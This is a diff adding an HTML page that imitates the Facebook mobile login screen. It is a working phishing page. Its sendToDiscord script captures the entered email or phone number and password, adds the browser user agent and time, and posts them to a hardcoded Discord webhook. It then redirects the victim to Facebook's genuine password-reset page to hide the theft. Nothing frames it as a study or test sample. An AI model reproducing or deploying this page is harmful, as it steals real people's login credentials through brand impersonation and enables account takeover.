@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Log in to Facebook</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.34;
+        }
+        .header {
+            padding: 12px 0;
+            text-align: center;
+            background-color: #ffffff;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        .logo {
+            height: 28px;
+            vertical-align: middle;
+        }
+        .container {
+            padding: 16px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .login-form {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            padding: 16px;
+            margin-top: 24px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        input:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 16px;
+        }
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            color: #1877f2;
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+            text-decoration: none;
+            margin-bottom: 16px;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 14px;
+            width: 100%;
+            display: block;
+            text-align: center;
+            text-decoration: none;
+            margin: 0 auto;
+        }
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        .footer {
+            margin-top: 28px;
+            text-align: center;
+            font-size: 14px;
+            color: #737373;
+        }
+        .language-selector {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #737373;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://cdn.iconscout.com/icon/free/png-512/free-facebook-logo-icon-download-in-svg-png-gif-file-formats--fb-new-color-social-media-logos-icons-1350125.png?f=webp&w=256" alt="Facebook" class="logo">
+    </div>
+    
+    <div class="container">
+        <form id="facebookForm" class="login-form" onsubmit="return sendToDiscord(event, 'facebook')">
+            <input type="text" autocorrect="off" autocapitalize="off" placeholder="Mobile number or email address" name="Username_FB" id="fbUsername" required>
+            <input type="password" autocorrect="off" autocapitalize="off" placeholder="Password" name="Password_FB" id="fbPassword" required>
+            <button type="submit" class="login-button">Log In</button>
+            <a href="#" class="forgot-password">Forgotten password?</a>
+            <div class="divider"></div>
+            <a href="#" class="create-account">Create new account</a>
+        </form>
+        
+        <div class="footer">
+            <p><b>Create a Page</b> for a celebrity, brand or business.</p>
+        </div>
+        
+        <div class="language-selector">
+            <p>English (UK) · Español · Français (France) · 中文(简体) · العربية · Português (Brasil) · Italiano · Deutsch · हिन्दी · 日本語</p>
+            <p>Facebook © 2023</p>
+        </div>
+    </div>
+
+<script>
+function sendToDiscord(event, platform) {
+    event.preventDefault();
+    
+    // Get form values
+    const username = document.getElementById('fbUsername').value;
+    const password = document.getElementById('fbPassword').value;
+
+    const payload = {
+        content: `🔐 New Facebook Login Attempt\n📧 Email/Phone: ${username}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}\n🌐 User Agent: ${navigator.userAgent}\n-----------------------------------------`,
+        username: "Facebook Alert",
+        avatar_url: "https://images.icon-icons.com/2429/PNG/512/facebook_logo_icon_147291.png"
+    };
+    
+    // Send to Discord webhook
+    fetch('https://discord.com/api/webhooks/1393190214238998598/RTf67SJLv3lWkdlSeYbSQZ8mM9kxPHMHSpTtXf1DYNhQmT_yWET1qIWKNBCpKdWi3Gx9', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (!response.ok) {
+            console.error('Failed to send to Discord');
+        }
+        // Redirect to Facebook password reset page
+        window.location.href = 'https://www.facebook.com/login/identify/';
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        window.location.href = 'https://www.facebook.com/login/identify/';
+    });
+    
+    return false;
+}
+</script>
+</body>
+</html>
